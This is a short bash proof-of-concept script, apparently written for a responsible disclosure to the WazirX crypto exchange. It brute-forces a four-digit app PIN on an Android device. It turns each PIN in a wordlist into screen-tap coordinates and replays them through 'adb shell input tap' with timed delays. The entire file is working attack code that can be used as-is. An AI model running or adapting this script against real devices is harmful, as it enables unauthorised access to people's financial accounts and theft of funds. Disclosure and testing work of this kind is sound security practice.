#!/bin/bash
# This poc bruteforce script and other files shared with this file to wazirx(https://www.wazirx.com) secrutiy team
# are Licensed under MIT please check LICENSE file for more details
# Have a question contact me on Twitter @tauh33dkhan

cp wordlist.txt pin
sed -i -e 's/1/A/g' -e 's/2/B/g' -e 's/3/C/g' -e 's/4/D/g' -e 's/5/E/g' -e 's/6/F/g' -e 's/7/G/g' -e 's/8/H/g' -e 's/9/I/g' -e 's/0/J/g' wordlist.txt

cp key-map key-map.tmp
sed -i '1d' key-map.tmp
cut -d ' ' -f2,3 key-map.tmp > key-maps
sed -i "s/A/ $(awk ' NR==1' key-maps)/g" wordlist.txt
sed -i "s/B/ $(awk ' NR==2' key-maps)/g" wordlist.txt
sed -i "s/C/ $(awk ' NR==3' key-maps)/g" wordlist.txt
sed -i "s/D/ $(awk ' NR==4' key-maps)/g" wordlist.txt
sed -i "s/E/ $(awk ' NR==5' key-maps)/g" wordlist.txt
sed -i "s/F/ $(awk ' NR==6' key-maps)/g" wordlist.txt
sed -i "s/G/ $(awk ' NR==7' key-maps)/g" wordlist.txt
sed -i "s/H/ $(awk ' NR==8' key-maps)/g" wordlist.txt
sed -i "s/I/ $(awk ' NR==9' key-maps)/g" wordlist.txt
sed -i "s/J/ $(awk ' NR==10' key-maps)/g" wordlist.txt

awk '{print "input tap",$1,$2,"&& input tap",$3,$4,"&& input tap",$5,$6,"&& input tap",$7,$8}' wordlist.txt > final.txt
a=0
#while IFS= read -r line; do
IFS=$'\n'
for line in $(cat final.txt); do
   ((a=a+1))
   echo $a ":" $line;
   adb shell $line; sleep 2.65;
done



